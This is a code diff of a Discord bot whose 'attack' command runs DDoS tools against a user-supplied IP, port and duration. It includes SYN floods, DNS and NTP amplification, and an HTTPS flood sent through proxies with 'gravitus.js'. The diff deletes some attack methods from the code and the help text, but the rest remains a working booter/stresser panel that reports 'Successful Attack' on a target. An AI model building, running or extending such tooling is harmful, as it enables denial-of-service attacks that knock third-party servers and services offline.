@@ -151,30 +151,6 @@ async def attack(ctx, metodo: str = None, ip: str = None, port: str = None, tiem
         comando = f'./tcp-syn {ip} {port_int} {tiempo_int}'
         await ctx.send(f'Successful Attack TCP-SYN TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
 
-    elif metodo == 'tcp-ack':
-        comando = f'./tcp-ack {ip} {port_int} {tiempo_int}'
-        await ctx.send(f'Successful Attack TCP-ACK TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
-
-    elif metodo == 'tcp-tls':
-        comando = f'./tcp-tls {ip} {port_int} {tiempo_int}'
-        await ctx.send(f'Successful Attack TCP-TLS TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
-
-    elif metodo == 'dns':
-        comando = f'./dns {ip} {port_int} {tiempo_int}'
-        await ctx.send(f'Successful Attack DNS TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
-
-    elif metodo == 'ntp':
-        comando = f'./ntp {ip} {port_int} {tiempo_int}'
-        await ctx.send(f'Successful Attack NTP TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
-
-    elif metodo == 'https-raw':
-        comando = f'./httpsraw {ip} {port_int} {tiempo_int}'
-        await ctx.send(f'Successful Attack HTTPs-Raw TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
-
-    elif metodo == 'tls':
-        comando = f'./tls {ip} {port_int} {tiempo_int}'
-        await ctx.send(f'Successful Attack TLS TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
-
     elif metodo == 'https-request':
         # Example: node gravitus.js <ip> <time> 30 10 proxy.txt
         comando = f'node gravitus.js {ip} {tiempo_int} 30 10 proxy.txt'  # Adjust threads/rate as needed
@@ -205,17 +181,9 @@ Methods L4 UDP Protocol:
 Methods L4 TCP Protocol:
 • tcp
 • tcp-syn (Multi-threaded)
-• tcp-ack
-• tcp-tls
 • ovh
 
-Methods AMP:
-• dns
-• ntp
-
 Methods L7:
-• https-raw
-• tls
 • https-request (proxy)
 """
     await ctx.send(methods_info)
